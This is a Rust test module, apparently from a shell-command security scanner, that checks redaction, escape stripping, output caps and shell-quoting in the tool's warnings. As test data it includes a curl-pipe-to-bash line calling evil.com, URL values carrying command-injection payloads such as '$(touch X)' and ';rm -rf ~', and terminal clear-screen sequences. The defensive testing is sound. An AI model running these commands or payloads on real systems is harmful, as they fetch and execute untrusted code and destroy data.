            "JSON must not carry the DETECTED banner string: {json}"
        );
    }

    #[test]
    fn write_json_findings_carry_remediation() {
        // Each finding in JSON must gain a `remediation` field flattened in
        // alongside rule_id/severity/title.
        let verdict = block_verdict_with_bypass();
        let mut buf = Vec::new();
        write_json(&verdict, &[], &mut buf).unwrap();
        let v: serde_json::Value = serde_json::from_slice(&buf).unwrap();
        let finding = &v["findings"][0];
        assert_eq!(finding["rule_id"], "plain_http_to_sink");
        // remediation present and equal to the canonical per-rule advice.
        assert_eq!(
            finding["remediation"].as_str().unwrap(),
            crate::rule_explanations::remediation(RuleId::PlainHttpToSink)
        );
    }

    #[test]
    fn write_json_omits_safe_suggestions_when_none() {
        // Default `write_json` must not emit a `safe_suggestions` key at all.
        let verdict = block_verdict_with_bypass();
        let mut buf = Vec::new();
        write_json(&verdict, &[], &mut buf).unwrap();
        let v: serde_json::Value = serde_json::from_slice(&buf).unwrap();
        assert!(v.get("safe_suggestions").is_none());
    }

    #[test]
    fn write_json_with_suggestions_embeds_them() {
        let verdict = block_verdict_with_bypass();
        let sugg = crate::safe_command::suggest(
            "curl http://evil.com/x.sh | bash",
            crate::tokenize::ShellType::Posix,
            &verdict,
        );
        let mut buf = Vec::new();
        write_json_with_suggestions(&verdict, &[], Some(&sugg), &mut buf).unwrap();
        let v: serde_json::Value = serde_json::from_slice(&buf).unwrap();
        let arr = v["safe_suggestions"].as_array().unwrap();
        assert_eq!(arr.len(), 1);
        assert_eq!(arr[0]["rule_id"], "plain_http_to_sink");
    }

    #[test]
    fn shared_json_writer_redacts_then_caps_pathological_output() {
        let verdict = block_verdict_with_bypass();
        let canary = "C02_WRITER_SECRET_CANARY";
        let suggestions = vec![SafeSuggestion {
            rule_id: "plain_http_to_sink".to_string(),
            safe_command: None,
            rationale: canary.repeat(30_000),
            remediation: "r".repeat(300_000),
        }];
        let mut buf = Vec::new();
        write_json_with_suggestions(
            &verdict,
            &[regex::escape(canary)],
            Some(&suggestions),
            &mut buf,
        )
        .unwrap();

        assert!(buf.len() <= crate::verdict::MAX_PRESENTATION_BYTES);
        let value: serde_json::Value = serde_json::from_slice(&buf).unwrap();
        assert_eq!(value["action"], "block");
        assert_eq!(value["presentation_truncated"], true);
        assert!(!String::from_utf8(buf).unwrap().contains(canary));
    }

    #[test]
    fn shared_json_writer_embeds_captured_policy_diagnostics_safely() {
        let custom = "C02_OUTPUT_POLICY_DIAGNOSTIC_CANARY";
        let github = format!("ghp_{}", "a1B2c3D4".repeat(5));
        let source = format!(
            "{}\u{1b}[31m{}-{}\u{200b}{}",
            &github[..17],
            &github[17..],
            &custom[..13],
            &custom[13..]
        );
        let _capture = crate::policy::PolicyDiagnosticCapture::start();
        let _ = crate::policy::Policy::load_from_yaml("[", Some(&source));
        let verdict = Verdict::allow_fast(1, Timings::default());
        let mut bytes = Vec::new();

        write_json_with_suggestions(&verdict, &[regex::escape(custom)], None, &mut bytes).unwrap();
        let serialized = String::from_utf8(bytes).unwrap();
        let value: serde_json::Value = serde_json::from_str(&serialized).unwrap();

        assert!(!serialized.contains(&github));
        assert!(!serialized.contains(custom));
        assert!(!serialized.contains("\\u001b"));
        assert!(!serialized.contains("\\u200b"));
        assert!(value["policy_diagnostics_count"]
            .as_u64()
            .is_some_and(|count| count >= 1));
        let diagnostics = value["policy_diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .filter_map(serde_json::Value::as_str)
            .collect::<Vec<_>>()
            .join(" ");
        assert!(diagnostics.contains("[REDACTED:GitHub PAT]"));
        assert!(diagnostics.contains("[REDACTED:custom]"));
    }

    #[test]
    fn human_color_and_no_color_paths_redact_custom_url_secrets_before_bounding() {
        let canary = "C02_HUMAN_URL_SECRET";
        let mut verdict = block_verdict_with_bypass();
        verdict.findings[0].title = format!("blocked {canary}");
        verdict.findings[0].description = format!("url carried {canary}");
        verdict.findings[0].evidence = vec![Evidence::Url {
            raw: format!("https://example.test/install?token={canary}"),
        }];
        let patterns = vec![regex::escape(canary)];

        for color_path in [true, false] {
            let mut buf = Vec::new();
            if color_path {
                write_human_with_patterns(&verdict, false, &patterns, &mut buf).unwrap();
            } else {
                write_human_no_color(&verdict, false, &patterns, &mut buf).unwrap();
            }
            let rendered = String::from_utf8(buf).unwrap();
            assert!(!rendered.contains(canary), "raw custom secret: {rendered}");
            assert!(rendered.contains("[REDACTED:custom]"), "{rendered}");
            assert!(
                !rendered.contains("To allow: tirith trust add"),
                "redaction changed the original trust target, so no runnable trust command is valid: {rendered}"
            );
            assert!(rendered.contains("trust this target manually"));
        }
    }

    #[test]
    fn public_human_writer_arity_remains_compatible() {
        let verdict = block_verdict_with_bypass();
        let mut output = Vec::new();
        write_human(&verdict, false, &mut output).unwrap();
        assert!(String::from_utf8(output).unwrap().contains("tirith:"));
        let _old_auto_signature: fn(&Verdict, bool) -> std::io::Result<()> = write_human_auto;
    }

    #[test]
    fn human_color_and_no_color_paths_have_a_final_streaming_byte_cap() {
        use crate::verdict::SuspiciousChar;

        let suspicious = (0..64)
            .map(|_| SuspiciousChar {
                offset: 0,
                character: 'x',
                codepoint: String::new(),
                description: String::new(),
                hex_bytes: String::new(),
            })
            .collect::<Vec<_>>();
        let findings = (0..32)
            .map(|_| Finding {
                rule_id: RuleId::MixedScriptInLabel,
                severity: Severity::High,
                title: "homoglyph".to_string(),
                description: "rendering amplification".to_string(),
                evidence: (0..16)
                    .map(|_| Evidence::HomoglyphAnalysis {
                        raw: "x".to_string(),
                        escaped: "x".to_string(),
                        suspicious_chars: suspicious.clone(),
                    })
                    .collect(),
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            })
            .collect();
        let verdict = Verdict::from_findings(findings, 3, Timings::default());

        for color_path in [true, false] {
            let mut output = Vec::new();
            if color_path {
                write_human_with_patterns(&verdict, false, &[], &mut output).unwrap();
            } else {
                write_human_no_color(&verdict, false, &[], &mut output).unwrap();
                assert!(!output.contains(&0x1b));
            }
            assert!(output.len() <= crate::verdict::MAX_PRESENTATION_BYTES);
            assert!(String::from_utf8(output)
                .unwrap()
                .contains("[presentation truncated:"));
        }
    }

    #[test]
    fn one_invocation_writer_caps_verdict_and_suggestions_with_one_marker() {
        let mut verdict = block_verdict_with_bypass();
        verdict.findings[0].description = "d".repeat(crate::verdict::MAX_PRESENTATION_BYTES * 2);
        let suggestions = vec![SafeSuggestion {
            rule_id: "plain_http_to_sink".to_string(),
            safe_command: None,
            rationale: "r".repeat(crate::verdict::MAX_PRESENTATION_BYTES),
            remediation: "m".repeat(crate::verdict::MAX_PRESENTATION_BYTES),
        }];
        let mut output = Vec::new();
        let mut invocation = HumanInvocationWriter::new(&mut output, false);
        write_human_to_invocation_with_patterns(&verdict, false, &[], &mut invocation).unwrap();
        write_safe_suggestions(&suggestions, &[], &mut invocation).unwrap();
        invocation.finish().unwrap();

        assert!(output.len() <= crate::verdict::MAX_PRESENTATION_BYTES);
        let rendered = String::from_utf8(output).unwrap();
        assert_eq!(rendered.matches("[presentation truncated:").count(), 1);
    }

    #[test]
    fn write_json_with_suggestions_withholds_command_changed_by_redaction() {
        // A SafeSuggestion's `safe_command` re-embeds the original command/URL,
        // so a secret the caller asked to redact via `custom_patterns` would be
        // reintroduced verbatim into JSON unless the suggestion is redacted too.
        // Build a suggestion whose rewrite carries the secret, then assert the
        // raw secret never reaches the serialized output. The rewritten string
        // has not been analyzed after redaction, so the executable field must be
        // omitted rather than changed in place.
        let verdict = block_verdict_with_bypass();
        let secret = "SECRET123";
        let custom = vec![secret.to_string()];
        let sugg = vec![SafeSuggestion {
            rule_id: "curl_pipe_shell".to_string(),
            // Mirrors what `rewrite_pipe_to_shell` emits: the original URL is the
            // runner's quoted argument and Tirith is absolute. Here the URL
            // carries the custom-pattern token.
            safe_command: Some(format!(
                "'/usr/local/bin/tirith' run --capsule --script-stdin --interpreter bash 'https://evil.example/{secret}'"
            )),
            // Also plant it in the rationale to cover runtime-derived guidance.
            rationale: format!("downloads {secret} for review"),
            remediation: "review before running".to_string(),
        }];

        let mut buf = Vec::new();
        write_json_with_suggestions(&verdict, &custom, Some(&sugg), &mut buf).unwrap();
        let raw = String::from_utf8(buf).unwrap();

        // The raw secret must NOT survive anywhere in the serialized JSON.
        assert!(
            !raw.contains(secret),
            "custom-pattern secret must be redacted out of safe_suggestions JSON: {raw}"
        );
        // The redaction marker proves the rationale scrub ran.
        assert!(
            raw.contains("[REDACTED:custom]"),
            "redacted rationale must carry the custom redaction marker: {raw}"
        );

        // The suggestion structure remains, but the executable field is absent.
        let v: serde_json::Value = serde_json::from_str(&raw).unwrap();
        let arr = v["safe_suggestions"].as_array().unwrap();
        assert_eq!(arr.len(), 1);
        assert_eq!(arr[0]["rule_id"], "curl_pipe_shell");
        assert!(
            arr[0].get("safe_command").is_none(),
            "a post-verification mutation must be guidance-only: {}",
            arr[0]
        );
        // The static, secret-free fields pass through unchanged.
        assert_eq!(arr[0]["remediation"], "review before running");
    }

    #[test]
    fn human_output_includes_fix_line() {
        let verdict = block_verdict_with_bypass();
        let mut buf = Vec::new();
        write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
        let out = String::from_utf8(buf).unwrap();
        assert!(
            out.contains("Fix:"),
            "human output must show a Fix line: {out}"
        );
        assert!(
            out.contains(crate::rule_explanations::remediation(
                RuleId::PlainHttpToSink
            )),
            "Fix line must carry the rule's remediation: {out}"
        );
    }

    #[test]
    fn write_json_with_suggestions_recursively_scrubs_every_string_before_bounding() {
        let verdict = block_verdict_with_bypass();
        let secret = "C02_SUGGESTION_SPLIT_SECRET";
        let split = format!("{}\u{1b}[31m{}", &secret[..12], &secret[12..]);
        let suggestions = vec![SafeSuggestion {
            rule_id: format!("rule-{split}"),
            safe_command: Some(format!("echo {split}")),
            rationale: format!("reason {split}"),
            remediation: format!("fix {split}"),
        }];
        let mut output = Vec::new();

        write_json_with_suggestions(
            &verdict,
            &[regex::escape(secret)],
            Some(&suggestions),
            &mut output,
        )
        .unwrap();

        let rendered = String::from_utf8(output).unwrap();
        assert!(!rendered.contains(secret));
        assert!(!rendered.contains('\u{1b}'));
        let value: serde_json::Value = serde_json::from_str(&rendered).unwrap();
        let suggestion = &value["safe_suggestions"][0];
        assert!(suggestion["rule_id"]
            .as_str()
            .unwrap()
            .contains("[REDACTED:custom]"));
        assert!(suggestion["rationale"]
            .as_str()
            .unwrap()
            .contains("[REDACTED:custom]"));
        assert!(suggestion["remediation"]
            .as_str()
            .unwrap()
            .contains("[REDACTED:custom]"));
        assert!(suggestion.get("safe_command").is_none());
    }

    #[test]
    fn write_safe_suggestions_empty_is_silent() {
        let mut buf = Vec::new();
        write_safe_suggestions(&[], &[], &mut buf).unwrap();
        assert!(buf.is_empty(), "no suggestions → no output");
    }

    #[test]
    fn human_output_sanitizes_terminal_control_in_finding_fields() {
        // engine.rs embeds the offending URL/payload verbatim into a finding's
        // title/description. A blocklisted URL carrying terminal-control bytes
        // (here clear-screen + cursor-home) must be scrubbed before it is
        // written to the terminal (F11) — no raw ESC may reach the writer.
        let evil = "\x1b[2J\x1b[1;1Hwiped";
        let verdict = Verdict::from_findings(
            vec![Finding {
                rule_id: RuleId::PlainHttpToSink,
                severity: Severity::High,
                title: format!("Blocklisted URL {evil}"),
                description: format!("matched http://evil.example/{evil}/x.sh"),
                evidence: vec![Evidence::Url {
                    raw: "http://evil.example/x.sh".to_string(),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }],
            3,
            Timings::default(),
        );

        // no-color path
        let mut buf = Vec::new();
        write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
        assert!(
            !buf.contains(&0x1b),
            "no-color human output must strip raw ESC from finding fields"
        );
        let out = String::from_utf8(buf).unwrap();
        assert!(
            out.contains("Blocklisted URL") && out.contains("wiped"),
            "surrounding text must survive sanitization: {out}"
        );

        // color path (write_human emits its own SGR for styling, so we only
        // assert the untrusted payload's clear-screen/cursor-home are gone).
        let mut cbuf = Vec::new();
        write_human_with_patterns(&verdict, false, &[], &mut cbuf).unwrap();
        let cout = String::from_utf8(cbuf).unwrap();
        assert!(
            !cout.contains("\x1b[2J") && !cout.contains("\x1b[1;1H"),
            "color human output must strip the attacker's CSI sequences: {cout}"
        );
    }

    #[test]
    fn human_finding_fields_redact_secrets_reconstituted_by_control_removal() {
        let custom = "C02_HUMAN_FINDING_CUSTOM_CANARY";
        let github = format!("ghp_{}", "a1B2c3D4".repeat(5));
        let verdict = Verdict::from_findings(
            vec![Finding {
                rule_id: RuleId::PlainHttpToSink,
                severity: Severity::High,
                title: format!("{}\u{200b}{}", &custom[..12], &custom[12..]),
                description: format!("{}\u{1b}[31m{}", &github[..18], &github[18..]),
                evidence: Vec::new(),
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }],
            3,
            Timings::default(),
        );
        let mut bytes = Vec::new();

        write_human_no_color(&verdict, false, &[regex::escape(custom)], &mut bytes).unwrap();
        let output = String::from_utf8(bytes).unwrap();

        assert!(!output.contains(custom), "{output}");
        assert!(!output.contains(&github), "{output}");
        assert!(output.contains("[REDACTED:custom]"), "{output}");
        assert!(output.contains("[REDACTED:GitHub PAT]"), "{output}");
        assert!(!output.contains('\u{200b}'));
        assert!(!output.contains('\u{1b}'));
    }

    #[test]
    fn visual_line_sanitizes_terminal_control_in_homoglyph_raw() {
        use crate::verdict::SuspiciousChar;

        // Evidence::HomoglyphAnalysis.raw is the offending input verbatim, so a
        // payload that embeds a clear-screen CSI must be scrubbed before the
        // `Visual:` line reaches the terminal (F11). `raw` = "gіtESC[2Jub" where
        // 'і' is Cyrillic (U+0456, 2 bytes) at byte offset 1; the CSI lives in the
        // non-suspicious tail and must be stripped whole (no residual `[2J`).
        let raw = "gіt\x1b[2Jub".to_string();
        let suspicious = vec![SuspiciousChar {
            offset: 1,
            character: 'і',
            codepoint: "U+0456".to_string(),
            description: "Cyrillic 'і' (looks like Latin 'i')".to_string(),
            hex_bytes: "d1 96".to_string(),
        }];
        let verdict = Verdict::from_findings(
            vec![Finding {
                rule_id: RuleId::MixedScriptInLabel,
                severity: Severity::High,
                title: "Mixed-script hostname".to_string(),
                description: "homograph".to_string(),
                evidence: vec![Evidence::HomoglyphAnalysis {
                    raw,
                    // Keep `escaped` ASCII so the Escaped line can't be the source
                    // of any ESC byte the assertions catch.
                    escaped: "githubub".to_string(),
                    suspicious_chars: suspicious,
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }],
            3,
            Timings::default(),
        );

        // no-color path: the formatter emits only brackets, so no ESC at all may
        // appear anywhere in the output.
        let mut buf = Vec::new();
        write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
        assert!(
            !buf.contains(&0x1b),
            "no-color Visual line must strip raw ESC from homoglyph raw"
        );
        let out = String::from_utf8(buf).unwrap();
        assert!(
            out.contains("Visual:") && out.contains("[і]"),
            "the suspicious char must still be bracket-marked: {out}"
        );
        assert!(
            !out.contains("[2J"),
            "the clear-screen CSI must be stripped whole, no residual: {out}"
        );

        // color path: write_human emits its own SGR for styling, so we assert the
        // attacker's specific clear-screen CSI is gone (not "no ESC at all").
        let mut cbuf = Vec::new();
        write_human_with_patterns(&verdict, false, &[], &mut cbuf).unwrap();
        let cout = String::from_utf8(cbuf).unwrap();
        assert!(
            !cout.contains("\x1b[2J"),
            "color Visual line must strip the attacker's clear-screen CSI: {cout}"
        );
    }

    /// Helper: a Block verdict carrying a single finding with the given rule and
    /// evidence, mirroring `block_verdict_with_bypass`'s field initialization.
    fn block_verdict_with_evidence(rule_id: RuleId, evidence: Vec<Evidence>) -> Verdict {
        let mut v = Verdict::from_findings(
            vec![Finding {
                rule_id,
                severity: Severity::High,
                title: "t".to_string(),
                description: "d".to_string(),
                evidence,
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }],
            3,
            Timings::default(),
        );
        v.action = Action::Block;
        v.bypass_available = true;
        v
    }

    #[test]
    fn block_with_full_url_renders_to_allow_without_broad() {
        // 14a: a finding carrying a full URL emits the NARROW trust line — the
        // exact URL (single-quoted), the snake_case rule id, a 30d TTL, and NO
        // `--broad`.
        let verdict = block_verdict_with_evidence(
            RuleId::ShortenedUrl,
            vec![Evidence::Url {
                raw: "https://bit.ly/x".to_string(),
            }],
        );
        for color in [false, true] {
            let mut buf = Vec::new();
            if color {
                write_human_with_patterns(&verdict, false, &[], &mut buf).unwrap();
            } else {
                write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
            }
            let out = String::from_utf8(buf).unwrap();
            assert!(
                out.contains(
                    "To allow: tirith trust add 'https://bit.ly/x' --rule shortened_url --ttl 30d"
                ),
                "full-URL block must render the narrow, single-quoted To-allow line (color={color}): {out}"
            );
            assert!(
                !out.contains("--broad"),
                "a full URL is a narrow trust pattern — no --broad (color={color}): {out}"
            );
        }
    }

    #[test]
    fn pre_redacted_placeholder_never_becomes_runnable_trust_target() {
        let verdict = block_verdict_with_evidence(
            RuleId::ShortenedUrl,
            vec![Evidence::Url {
                raw: "https://example.test/[REDACTED:custom]".to_string(),
            }],
        );
        let mut buffer = Vec::new();
        write_human_no_color(&verdict, false, &[], &mut buffer).unwrap();
        let output = String::from_utf8(buffer).unwrap();
        assert!(!output.contains("tirith trust add 'https://"), "{output}");
        assert!(output.contains("trust this target manually"), "{output}");
    }

    #[test]
    fn finding_omitted_by_priority_budget_cannot_emit_trust_advisory() {
        let mut findings = (0..(crate::verdict::MAX_PRESENTED_FINDINGS + 4))
            .map(|index| Finding {
                rule_id: RuleId::CurlPipeShell,
                severity: Severity::Critical,
                title: format!("critical {index}"),
                description: "critical".to_string(),
                evidence: Vec::new(),
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            })
            .collect::<Vec<_>>();
        findings.push(Finding {
            rule_id: RuleId::ShortenedUrl,
            severity: Severity::High,
            title: "omitted URL".to_string(),
            description: "omitted".to_string(),
            evidence: vec![Evidence::Url {
                raw: "https://omitted.example/path".to_string(),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
        let mut verdict = Verdict::from_findings(findings, 3, Timings::default());
        verdict.action = Action::Block;
        let mut buffer = Vec::new();
        write_human_no_color(&verdict, false, &[], &mut buffer).unwrap();
        let output = String::from_utf8(buffer).unwrap();
        assert!(!output.contains("omitted.example"), "{output}");
        assert!(!output.contains("tirith trust add"), "{output}");
    }

    #[test]
    fn block_with_bare_domain_only_renders_broad_to_allow() {
        // 14a: a finding with only a HOST (no full URL) must emit the domain form
        // WITH `--broad` (single-quoted), because `trust add` rejects bare domains
        // otherwise.
        let verdict = block_verdict_with_evidence(
            RuleId::ConfusableDomain,
            vec![Evidence::HostComparison {
                raw_host: "gіthub.com".to_string(),
                similar_to: "github.com".to_string(),
            }],
        );
        let mut buf = Vec::new();
        write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
        let out = String::from_utf8(buf).unwrap();
        assert!(
            out.contains(
                "To allow (trusts the whole domain): tirith trust add 'gіthub.com' --broad --rule confusable_domain --ttl 30d"
            ),
            "bare-domain block must render the single-quoted --broad To-allow line: {out}"
        );
    }

    #[test]
    fn block_with_url_and_host_prefers_full_url_no_broad() {
        // When both a full URL and a host are present, the full URL wins (narrow,
        // no --broad, single-quoted) and only ONE To-allow line is emitted.
        let verdict = block_verdict_with_evidence(
            RuleId::PlainHttpToSink,
            vec![
                Evidence::HostComparison {
                    raw_host: "evil.example".to_string(),
                    similar_to: "ok.example".to_string(),
                },
                Evidence::Url {
                    raw: "http://evil.example/x.sh".to_string(),
                },
            ],
        );
        let mut buf = Vec::new();
        write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
        let out = String::from_utf8(buf).unwrap();
        assert!(
            out.contains(
                "tirith trust add 'http://evil.example/x.sh' --rule plain_http_to_sink --ttl 30d"
            ),
            "full URL must be preferred over the host: {out}"
        );
        assert!(
            !out.contains("--broad"),
            "full-URL path must not use --broad: {out}"
        );
        assert_eq!(
            out.matches("To allow").count(),
            1,
            "exactly one To-allow line: {out}"
        );
    }

    #[test]
    fn block_to_allow_url_shell_quotes_injection_payloads() {
        // F1 (HIGH): the To-allow line is meant to be copy/pasted into a shell,
        // so an attacker-controlled URL carrying shell metacharacters must be
        // single-quoted — a developer who pastes the suggested line must NOT
        // trigger command substitution, separators, redirects, or globbing.
        let hostile = [
            "https://x/$(touch X)",
            "https://x/`id`",
            "https://x/a;rm -rf ~",
            "https://x/a b",
            "https://x/a'b",
            "https://x/a>b",
            "https://x/a*b",
        ];
        for raw in hostile {
            let verdict = block_verdict_with_evidence(
                RuleId::ShortenedUrl,
                vec![Evidence::Url {
                    raw: raw.to_string(),
                }],
            );
            for color in [false, true] {
                let mut buf = Vec::new();
                if color {
                    write_human_with_patterns(&verdict, false, &[], &mut buf).unwrap();
                } else {
                    write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
                }
                let out = String::from_utf8(buf).unwrap();
                let line = out
                    .lines()
                    .find(|l| l.contains("tirith trust add"))
                    .unwrap_or_else(|| {
                        panic!("no To-allow line for {raw:?} (color={color}): {out}")
                    });
                // The emitted token is the single-quoted form of the URL. A
                // single quote in the URL is escaped as '\'' (still one token).
                let expected_token =
                    crate::safe_command::shell_single_quote(raw).expect("quotable URL");
                assert!(
                    line.contains(&expected_token),
                    "URL must be single-quoted on the To-allow line so a shell would NOT \
                     expand it (raw={raw:?}, color={color}): {line}"
                );
                // The dangerous fragment must never appear UNquoted (outside the
                // single-quoted token), which is what would let it execute.
                let outside = line.replace(&expected_token, "");
                for needle in ["$(", "`", ";rm", " a b", ">b", "*b"] {
                    assert!(
                        !outside.contains(needle),
                        "no bare {needle:?} may survive outside the quoted token \
                         (raw={raw:?}): {line}"
                    );
                }
            }
        }
    }

    #[test]
    fn block_to_allow_domain_shell_quotes_injection_payloads() {
        // F1 (HIGH): same neutralization on the bare-domain (`--broad`) branch.
        // `extract_domains_from_evidence` pulls the host from `raw_host`, so plant
        // the hostile metacharacters there.
        let verdict = block_verdict_with_evidence(
            RuleId::ConfusableDomain,
            vec![Evidence::HostComparison {
                raw_host: "evil.example/$(touch X)".to_string(),
                similar_to: "ok.example".to_string(),
            }],
        );
        let mut buf = Vec::new();
        write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
        let out = String::from_utf8(buf).unwrap();
        let line = out
            .lines()
            .find(|l| l.contains("tirith trust add"))
            .unwrap_or_else(|| panic!("no To-allow line: {out}"));
        assert!(
            line.contains('\''),
            "the domain target must be single-quoted: {line}"
        );
        // `$(touch X)` must not appear bare (outside the quoted token).
        assert!(
            !line.contains("add $(") && !line.contains("add evil.example/$("),
            "the command substitution must be inside single quotes, not runnable: {line}"
        );
    }

    #[test]
    fn block_to_allow_url_with_newline_prints_safe_fallback_not_command() {
        // F1 (HIGH): a target that cannot be safely single-quoted (it contains a
        // newline) must NOT yield a runnable `tirith trust add` command line —
        // instead a safe manual-trust note is printed.
        let verdict = block_verdict_with_evidence(
            RuleId::ShortenedUrl,
            vec![Evidence::Url {
                raw: "https://x/a\nrm -rf ~".to_string(),
            }],
        );
        for color in [false, true] {
            let mut buf = Vec::new();
            if color {
                write_human_with_patterns(&verdict, false, &[], &mut buf).unwrap();
            } else {
                write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
            }
            let out = String::from_utf8(buf).unwrap();
            assert!(
                !out.contains("tirith trust add 'https"),
                "an unquotable (newline) target must not produce a runnable command (color={color}): {out}"
            );
            assert!(
                out.contains("trust this target manually with `tirith trust add`"),
                "an unquotable target must fall back to the safe manual note (color={color}): {out}"
            );
        }
    }

    #[test]
    fn block_to_allow_target_changed_by_scrub_prints_safe_fallback_not_command() {
        // If terminal-control scrubbing CHANGES the target (here a zero-width
        // space is stripped), a `trust add <scrubbed>` would trust a DIFFERENT
        // target than the one blocked, so we must print the manual fallback rather
        // than a misleading runnable command.
        let verdict = block_verdict_with_evidence(
            RuleId::ShortenedUrl,
            vec![Evidence::Url {
                // U+200B ZERO WIDTH SPACE inside the host: quotable, but scrubbed.
                raw: "https://exa\u{200b}mple.com/x".to_string(),
            }],
        );
        for color in [false, true] {
            let mut buf = Vec::new();
            if color {
                write_human_with_patterns(&verdict, false, &[], &mut buf).unwrap();
            } else {
                write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
            }
            let out = String::from_utf8(buf).unwrap();
            assert!(
                !out.contains("tirith trust add 'https"),
                "a scrub-altered target must not produce a runnable command (color={color}): {out}"
            );
            assert!(
                out.contains("trust this target manually with `tirith trust add`"),
                "a scrub-altered target must fall back to the safe manual note (color={color}): {out}"
            );
        }
    }

    #[test]
    fn block_with_destructive_finding_renders_blast_radius_header() {
        // 14c: a Block containing a destructive Blast* finding renders the
        // blast-radius header pointing at `tirith preview`.
        let verdict = block_verdict_with_evidence(
            RuleId::BlastDeletesOutsideRepo,
            vec![Evidence::Text {
                detail: "target '/home' is outside the repo".to_string(),
            }],
        );
        for color in [false, true] {
            let mut buf = Vec::new();
            if color {
                write_human_with_patterns(&verdict, false, &[], &mut buf).unwrap();
            } else {
                write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
            }
            let out = String::from_utf8(buf).unwrap();
            assert!(
                out.contains("blast radius:") && out.contains("tirith preview -- <cmd>"),
                "destructive block must render the blast-radius header (color={color}): {out}"
            );
        }
    }

    #[test]
    fn block_with_fetch_pipe_finding_renders_blast_radius_header() {
        // 14c: the fetch-pipe family (here CurlPipeShell) also trips the header.
        let verdict = block_verdict_with_evidence(
            RuleId::CurlPipeShell,
            vec![Evidence::Text {
                detail: "curl https://x | bash".to_string(),
            }],
        );
        let mut buf = Vec::new();
        write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
        let out = String::from_utf8(buf).unwrap();
        assert!(
            out.contains("blast radius:"),
            "curl-pipe-shell block must render the blast-radius header: {out}"
        );
    }

    #[test]
    fn block_without_url_or_destructive_renders_neither_advisory() {
        // A non-URL, non-destructive block (e.g. a bidi-control terminal finding
        // whose only evidence is a byte sequence) must emit NEITHER the To-allow
        // line NOR the blast-radius header.
        let verdict = block_verdict_with_evidence(
            RuleId::BidiControls,
            vec![Evidence::ByteSequence {
                offset: 0,
                hex: "e2 80 ae".to_string(),
                description: "RIGHT-TO-LEFT OVERRIDE".to_string(),
            }],
        );
        let mut buf = Vec::new();
        write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
        let out = String::from_utf8(buf).unwrap();
        assert!(
            !out.contains("To allow"),
            "no URL/host → no To-allow line: {out}"
        );
        assert!(
            !out.contains("blast radius:"),
            "non-destructive → no blast-radius header: {out}"
        );
    }

    #[test]
    fn non_block_verdict_renders_no_block_advisories() {
        // The advisories are gated on Action::Block; a Warn verdict (even with a
        // URL) must not show them.
        let mut verdict = block_verdict_with_evidence(
            RuleId::ShortenedUrl,
            vec![Evidence::Url {
                raw: "https://bit.ly/x".to_string(),
            }],
        );
        verdict.action = Action::Warn;
        let mut buf = Vec::new();
        write_human_no_color(&verdict, false, &[], &mut buf).unwrap();
        let out = String::from_utf8(buf).unwrap();
        assert!(
            !out.contains("To allow"),
            "Warn must not show To-allow: {out}"
        );
        assert!(
            !out.contains("blast radius:"),
            "Warn must not show blast-radius: {out}"
        );
    }

    #[test]
    fn write_safe_suggestions_renders_try_and_fix() {
        // Rendering is tested with a deliberately constructed, already-verified
        // suggestion. Public generation is provenance-sensitive and correctly
        // remains guidance-only for Cargo's replaceable test binary.
        let sugg = vec![SafeSuggestion {
            rule_id: "curl_pipe_shell".to_string(),
            safe_command: Some(
                "'/usr/local/bin/tirith' run --capsule --script-stdin --interpreter bash 'https://example.com/x.sh'"
                    .to_string(),
            ),
            rationale: "verified contained runner".to_string(),
            remediation: "review before running".to_string(),
        }];
        let mut buf = Vec::new();
        write_safe_suggestions(&sugg, &[], &mut buf).unwrap();
        let out = String::from_utf8(buf).unwrap();
        assert!(out.contains("safer alternative"), "{out}");
        assert!(out.contains("try:"), "{out}");
        assert!(
            out.contains("'/usr/local/bin/tirith' run --capsule --script-stdin --interpreter bash 'https://example.com/x.sh'"),
            "{out}"
        );
        assert!(out.contains("fix:"), "{out}");
    }

    #[test]
    fn write_safe_suggestions_redacts_and_confines_every_human_field() {
        let secret = "TENANT-SECRET-42";
        let suggestions = vec![SafeSuggestion {
            rule_id: format!("rule\x1b]52;c;YQ==\x07\n{secret}"),
            safe_command: Some(format!("echo {secret}\x1b[2J\nspoof")),
            rationale: format!("reason\rspoof\x1b[31m\u{202e} {secret}"),
            remediation: format!("fix\nspoof\t{secret}"),
        }];
        let mut buf = Vec::new();
        write_safe_suggestions(&suggestions, &[secret.to_string()], &mut buf).unwrap();
        let out = String::from_utf8(buf).unwrap();

        assert!(!out.contains(secret), "custom secret leaked: {out:?}");
        assert!(!out.contains('\x1b'), "terminal escape leaked: {out:?}");
        assert!(!out.contains('\u{202e}'), "bidi control leaked: {out:?}");
        assert!(out.contains("rule\\n[REDACTED:custom]"), "{out:?}");
        assert!(
            out.contains("executable command omitted because redaction would change"),
            "{out:?}"
        );
        assert!(out.contains("reasonspoof"), "{out:?}");
        assert!(out.contains("fix\\nspoof\\t[REDACTED:custom]"), "{out:?}");
    }
}
